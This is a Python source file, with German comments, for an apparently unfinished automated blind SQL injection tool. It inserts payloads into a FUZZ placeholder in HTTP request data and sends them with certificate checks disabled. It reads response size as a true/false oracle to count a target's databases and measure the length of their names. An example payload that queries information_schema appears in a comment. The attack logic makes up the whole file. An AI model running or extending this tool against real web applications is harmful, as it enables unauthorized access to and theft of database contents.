from BlindSqlInjection import BlindSqlInjection
import requests
import warnings
import urllib3

# VAR INIT
blindSqlInjection = BlindSqlInjection()

class Invoke_SqlInjection:
    def __init__(self,validate_object,request_content):
        self.validate_object = validate_object
        self.request_content = request_content

# to validate OPTIONEN
# \-> contentsize -> das geht
# \-> status code -> das geht
# \-> text pattern -> re.macth
# \-> how it has to look like:
# \-> param=FUZZ' and (SELECT COUNT(*) FROM information_schema.schemata)>1 -- -
    def prepare_request(self,sql_statement):
        result = self.request_content['data'].replace('FUZZ',sql_statement)
         print(f"inside preapre -> {result}")
        self.request_content['data'] = result

        print(f"inside preapre -> {self.request_content['data']}")
        return self.start_request()

    def start_request(self):
        # das soll multi thread laufen!
        # jeder lauf in einen Dict mit den counter hinterlegen
        condition = True
        counter = 0
        loop_dict = {}
        while (condition):
            counter += 1
            dynamic_data = self.request_content['data'].replace('_counter_',f"{counter}")

            with warnings.catch_warnings():
                warnings.simplefilter("ignore", urllib3.exceptions.InsecureRequestWarning)
                response = requests.request(
                  method=str(self.request_content['methode']),
                  url=str(self.request_content['url']),
                  headers=self.request_content.get('headers'),
                  data=dynamic_data,
                  verify=False,
                )
            print(dynamic_data)
            loop_dict[counter] = response
            if (not self.validate(response)):
              condition = False
              return loop_dict


    def validate(self,response):
        if "fs" in self.validate_object:
            # will return True or False
            return len(response.content) >= int(self.validate_object['fs'])

    def assemble(self):
       obj = {
               "databases": {}
            }

       if 'amount' not in obj['databases']:
           obj['databases']['amount'] = self.get_data('databases','amount')
           obj['databases']['names'] = self.get_data('databases','names')
       print(obj)

    def get_data(self, parent, child):

       if (parent == 'databases'):
           if (child == 'amount'):
               result_sqlStatement = blindSqlInjection.get_databases_number()
           if (child == 'names'):
               # change child to amount to get the number
               child = 'name_length'
               result_sqlStatement = blindSqlInjection.get_length_name()
       print(result_sqlStatement)

       loop_dict_response = self.prepare_request(result_sqlStatement)
       return self.parse_data(parent,child,loop_dict_response)

    def parse_data(self,parent,child,loop_dict_response):
       if (parent == 'databases'):
           if (child == 'amount' or child == 'name_length'):
               #sortiere
               sorted_loop_dict_response = dict(sorted(loop_dict_response.items()))
               # gebe nur den größten key zurück
               last_key, last_value = sorted_loop_dict_response.popitem()
               return last_key
